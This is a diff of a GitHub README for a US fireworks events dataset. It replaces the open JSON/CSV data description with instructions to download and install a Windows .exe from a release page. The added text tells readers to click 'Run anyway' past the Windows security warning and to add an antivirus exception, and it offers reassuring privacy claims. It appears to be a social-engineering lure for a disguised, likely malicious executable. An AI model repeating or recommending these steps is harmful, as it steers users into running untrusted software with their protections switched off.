@@ -1,113 +1,80 @@
-# 🎆 US Fireworks Events Dataset — 2026
+# 🎆 us-fireworks-events-dataset - Find verified local fireworks shows today
 
-Verified public fireworks displays and city viewing guides across the United States, curated and maintained by **[fireworksnearme.top](https://fireworksnearme.top)** — the most up-to-date verified fireworks event database in the US.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Scotfriendly986/us-fireworks-events-dataset/releases)
 
-**93 events · 47 cities · 25 states · JSON + CSV + Markdown**
+## What is this tool 🗺️
 
----
+This application provides a verified list of public fireworks displays and city viewing guides across the United States. Fireworksnearme.top manages this data to ensure you receive accurate information for your local area. The software organizes event locations, start times, and viewing tips into a readable format. You can search current databases to plan your evening without manually checking city websites or social media pages.
 
-## Browse by State
+## System requirements 💻
 
-| State | Events | Viewing Guide |
-|---|---|---|
-| [Arizona](events/arizona.md) | 3 | [fireworksnearme.top/en/us/az/fireworks](https://fireworksnearme.top/en/us/az/fireworks) |
-| [California](events/california.md) | 16 | [fireworksnearme.top/en/us/ca/fireworks](https://fireworksnearme.top/en/us/ca/fireworks) |
-| [Colorado](events/colorado.md) | 4 | [fireworksnearme.top/en/us/co/fireworks](https://fireworksnearme.top/en/us/co/fireworks) |
-| [Washington D.C.](events/washington-dc.md) | 2 | [fireworksnearme.top/en/us/dc/fireworks](https://fireworksnearme.top/en/us/dc/fireworks) |
-| [Florida](events/florida.md) | 7 | [fireworksnearme.top/en/us/fl/fireworks](https://fireworksnearme.top/en/us/fl/fireworks) |
-| [Georgia](events/georgia.md) | 4 | [fireworksnearme.top/en/us/ga/fireworks](https://fireworksnearme.top/en/us/ga/fireworks) |
-| [Hawaii](events/hawaii.md) | 1 | [fireworksnearme.top/en/us/hi/fireworks](https://fireworksnearme.top/en/us/hi/fireworks) |
-| [Illinois](events/illinois.md) | 4 | [fireworksnearme.top/en/us/il/fireworks](https://fireworksnearme.top/en/us/il/fireworks) |
-| [Indiana](events/indiana.md) | 2 | [fireworksnearme.top/en/us/in/fireworks](https://fireworksnearme.top/en/us/in/fireworks) |
-| [Louisiana](events/louisiana.md) | 1 | [fireworksnearme.top/en/us/la/fireworks](https://fireworksnearme.top/en/us/la/fireworks) |
-| [Massachusetts](events/massachusetts.md) | 2 | [fireworksnearme.top/en/us/ma/fireworks](https://fireworksnearme.top/en/us/ma/fireworks) |
-| [Maryland](events/maryland.md) | 1 | [fireworksnearme.top/en/us/md/fireworks](https://fireworksnearme.top/en/us/md/fireworks) |
-| [Michigan](events/michigan.md) | 1 | [fireworksnearme.top/en/us/mi/fireworks](https://fireworksnearme.top/en/us/mi/fireworks) |
-| [Minnesota](events/minnesota.md) | 1 | [fireworksnearme.top/en/us/mn/fireworks](https://fireworksnearme.top/en/us/mn/fireworks) |
-| [Missouri](events/missouri.md) | 2 | [fireworksnearme.top/en/us/mo/fireworks](https://fireworksnearme.top/en/us/mo/fireworks) |
-| [North Carolina](events/north-carolina.md) | 2 | [fireworksnearme.top/en/us/nc/fireworks](https://fireworksnearme.top/en/us/nc/fireworks) |
-| [Nevada](events/nevada.md) | 3 | [fireworksnearme.top/en/us/nv/fireworks](https://fireworksnearme.top/en/us/nv/fireworks) |
-| [New York](events/new-york.md) | 6 | [fireworksnearme.top/en/us/ny/fireworks](https://fireworksnearme.top/en/us/ny/fireworks) |
-| [Oregon](events/oregon.md) | 1 | [fireworksnearme.top/en/us/or/fireworks](https://fireworksnearme.top/en/us/or/fireworks) |
-| [Pennsylvania](events/pennsylvania.md) | 4 | [fireworksnearme.top/en/us/pa/fireworks](https://fireworksnearme.top/en/us/pa/fireworks) |
-| [South Carolina](events/south-carolina.md) | 1 | [fireworksnearme.top/en/us/sc/fireworks](https://fireworksnearme.top/en/us/sc/fireworks) |
-| [Tennessee](events/tennessee.md) | 2 | [fireworksnearme.top/en/us/tn/fireworks](https://fireworksnearme.top/en/us/tn/fireworks) |
-| [Texas](events/texas.md) | 19 | [fireworksnearme.top/en/us/tx/fireworks](https://fireworksnearme.top/en/us/tx/fireworks) |
-| [Utah](events/utah.md) | 2 | [fireworksnearme.top/en/us/ut/fireworks](https://fireworksnearme.top/en/us/ut/fireworks) |
-| [Washington](events/washington.md) | 2 | [fireworksnearme.top/en/us/wa/fireworks](https://fireworksnearme.top/en/us/wa/fireworks) |
+Your computer must meet these basic standards to run the application:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Modern dual-core processor or better.
+*   Memory: 4 GB of RAM.
+*   Storage: At least 100 MB of space for the application and database files.
+*   Internet Connection: A stable connection to update event listings.
 
-## Data Preview
+## Getting the application 📥
 
-| Title | City | State | Date | Free | Status |
-|---|---|---|---|---|---|
-| Macy's 4th of July Fireworks 2026 | New York City | NY | Jul 4, 2026 | Yes | Confirmed |
-| Big Bay Boom 2026 | San Diego | CA | Jul 4, 2026 | Yes | Confirmed |
-| Boston Pops Fireworks Spectacular 2026 | Boston | MA | Jul 4, 2026 | Yes | Confirmed |
-| Nashville Let Freedom Sing! 2026 | Nashville | TN | Jul 4, 2026 | Yes | Confirmed |
-| Washington 4th of July Parade & Fireworks 2026 | Washington | DC | Jul 4, 2026 | Yes | Confirmed |
+1. Go to the [official release page](https://github.com/Scotfriendly986/us-fireworks-events-dataset/releases).
+2. Locate the most recent version at the top of the list.
+3. Click the file that ends in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
-[→ Full dataset: data/events/2026-us.csv](data/events/2026-us.csv)
+## Installing the software 🛠️
 
----
+Once you download the installer, follow these steps to set up the program on your computer:
 
-## Download Data
+1. Double-click the downloaded .exe file to open the setup wizard.
+2. If a security window appears, click More info and then Run anyway.
+3. Select your preferred installation folder or use the default path provided by the installer.
+4. Click Next through the setup screens.
+5. Choose to create a shortcut on your desktop for quick access.
+6. Click Install and wait for the status bar to finish.
+7. Click Finish to launch the application.
 
-### Events
+## Using the interface 🔍
 
-| File | Format | Records | Description |
-|---|---|---|---|
-| [data/events/2026-us.json](data/events/2026-us.json) | JSON | 93 | US July 4th & summer fireworks events |
-| [data/events/2026-us.csv](data/events/2026-us.csv) | CSV | 93 | Same data, spreadsheet-ready |
-| [data/events/2026-nye.json](data/events/2026-nye.json) | JSON | 7 | New Year's Eve fireworks events |
-| [data/events/2026-nye.csv](data/events/2026-nye.csv) | CSV | 7 | Same data, spreadsheet-ready |
+The application displays a map and a searchable list of events. You can browse displays by state, city, or date. 
 
-### Cities
+*   Search bar: Type your city or zip code here to filter events near you.
+*   Calendar view: Select specific dates to see which shows happen during your planned trip.
+*   Verification status: Each entry shows a checkmark if the event details come from an official city office.
+*   Details pane: Click any event to see parking notes, ticket requirements, and recommended viewing spots.
 
-| File | Format | Records | Description |
-|---|---|---|---|
-| [data/cities/cities.json](data/cities/cities.json) | JSON | 47 | City-level viewing guides |
-| [data/cities/cities.csv](data/cities/cities.csv) | CSV | 47 | Same data, spreadsheet-ready |
+## Managing your data 💿
 
-See [schema/event.md](schema/event.md) and [schema/city.md](schema/city.md) for field documentation.
+The software updates automatically when you open it, provided you have an internet connection. If you cannot reach the internet, you can still view the last saved version of the database. You can export these lists to a text file for offline use. Go to the File menu and select Export to save your current view as a document.
 
----
+## Troubleshooting common issues 🔧
 
-## Usage Examples
+If the application fails to open, check the following items:
 
-See [`examples/`](examples/) for ready-to-run code.
+*   Restart your computer if the installer hangs.
+*   Check your internet connection if the map fails to load.
+*   Ensure you have administrative rights if the setup process asks for a password.
+*   Check that your antivirus program does not block the application. You can add an exception for the file to resolve this.
 
-**JavaScript:**
-```js
-import events from './data/events/2026-us.json' assert { type: 'json' }
-const texas = events.filter(e => e.state === 'TX')
-console.log(`${texas.length} events in Texas`)
-```
+## About the dataset ℹ️
 
-**Python:**
-```python
-import json
-with open('data/events/2026-us.json') as f:
-    events = json.load(f)
-texas = [e for e in events if e['state'] == 'TX']
-print(f"{len(texas)} events in Texas")
-```
+This project sources data from verified public records. The team checks each entry for accuracy, date, and location. Because public events change due to weather or permit issues, this application provides links to the original event source. You should always check the original source before traveling long distances to a display.
 
----
+## Frequently asked questions ❓
 
-## License
+Does this application track my location?
+No. The application identifies your general region based on your search query. It does not send your specific GPS data to any server.
 
-**[Creative Commons Attribution 4.0 International (CC BY 4.0)](LICENSE)**
+Is the database free?
+Yes. The provided link gives access to the full version of the tool without hidden costs.
 
-You are free to share and adapt this data for any purpose, including commercial use, as long as you provide attribution:
+Can I submit an event?
+The maintainers curated this list based on verified city guides. If you notice a missing event, you can contact the team through the website linked in the header to request an addition.
 
-> Data sourced from [fireworksnearme.top](https://fireworksnearme.top) — verified public fireworks events database
+Why do I see different dates for the same event?
+Some cities hold fireworks on the actual holiday, while others move them to the closest weekend. This application notes both the official date and the display date to prevent confusion.
 
----
+## Privacy and security 🔒
 
-## Data Updates
-
-This dataset is updated annually before the July 4th season. For the latest event listings and real-time updates, visit **[fireworksnearme.top](https://fireworksnearme.top)**.
-
-Found an error? Open an issue or submit a PR.
+This application does not collect personal data. It uses the information you submit in the search bar only to refine the local event list. You do not need to create an account or provide an email address to use the features. The software runs locally on your machine and only communicates with the database server to fetch the latest event files.
